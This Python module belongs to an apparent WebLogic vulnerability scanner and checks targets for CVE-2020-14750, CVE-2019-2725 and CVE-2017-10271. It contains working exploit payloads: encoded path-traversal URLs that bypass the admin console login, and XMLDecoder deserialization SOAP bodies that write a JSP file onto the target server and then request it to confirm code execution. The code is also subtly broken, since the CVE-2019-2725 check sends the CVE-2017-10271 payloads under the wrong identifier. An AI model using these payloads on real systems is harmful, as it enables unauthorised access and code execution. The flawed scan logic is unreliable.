#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Weblogic扫描类: 
        Weblogic 权限验证绕过漏洞
            CVE-2020-14750
        Weblogic wls9_async_response 反序列化漏洞
            CVE-2019-2725
        Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
            CVE-2017-10271
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Weblogic():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Weblogic'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_14750_payloads = [
            {
                'path': 'console/images/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/images/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252e%252e%252fconsole.portal',
                'data': ''
            }
        ]

        self.cve_2019_2725_payloads = [
            {
                'path': '_async/AsyncResponseService',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/mouse.jsp</string><void method="println"><string><![CDATA[
<% out.println("CVE/2019/2725"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
            }
        ]

        self.cve_2017_10271_payloads = [
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            },
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/9j4dqk/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            }
        ]

    def cve_2020_14750_scan(self, url):
        ''' Weblogic 权限验证绕过漏洞
                可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2020-14750'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_14750_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (('管理控制台' in res.text) or ('Information and Resources' in res.text) or ('Overloaded' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2019_2725_scan(self, url):
        ''' Weblogic 
                部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogicServer提供异步通讯服务
                由于该WAR包在反序列化处理输入信息时存在缺陷, 在未授权的情况下可以远程执行命令
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'DeSerialization'
        vul_info['vul_id'] = 'CVE-2017-10271'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'text/xml'
        }

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2017_10271_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (res.status_code == 202):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + '_async/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )

                if ((verify_res.status_code == 200) and ('CVE/2019/2725' in verify_res.text)):
                    results = {
                        'Target': target,
                        'Verify': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'url': url,
                            'Path': path,
                            'Data': data,
                            'Headers': str(vul_info['headers'])
                        }
                    }
                    return results

    def cve_2017_10271_scan(self, url):
        ''' Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
                < 10.3.6
                Weblogic的WLS Security组件对外提供webservice服务, 其中使用了XMLDecoder来解析用户传入的XML数据, 在解析的过程中出现反序列化漏洞, 导致可执行任意命令
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'DeSerialization'
        vul_info['vul_id'] = 'CVE-2017-10271'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'text/xml'
        }

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2017_10271_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (res.status_code == 500):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + 'wls-wsat/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )

                if ((verify_res.status_code == 200) and ('CVE/2017/10271' in verify_res.text)):
                    results = {
                        'Target': target,
                        'Verify': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'url': url,
                            'Path': path,
                            'Data': data,
                            'Headers': str(vul_info['headers'])
                        }
                    }
                    return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2017_10271_scan, url=url),
            thread(target=self.cve_2019_2725_scan, url=url),
            thread(target=self.cve_2020_14750_scan, url=url)
        ]

weblogic = Weblogic()